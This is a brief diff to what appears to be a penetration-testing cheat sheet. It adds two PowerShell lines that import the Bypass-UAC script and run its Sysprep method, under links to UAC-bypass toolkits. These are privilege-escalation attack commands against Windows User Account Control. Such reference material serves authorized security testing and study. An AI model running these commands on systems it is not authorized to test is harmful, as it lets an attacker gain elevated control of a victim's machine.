@@ -4167,6 +4167,8 @@ C:\> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Poli
 ```
 https://github.com/hfiref0x/UACME
 https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
+PS C:\> Import-Module .\Bypass-UAC.ps1
+PS C:\> Bypass-UAC -Method UacMethodSysprep
 ```
 
 - Downgrade PowerShell
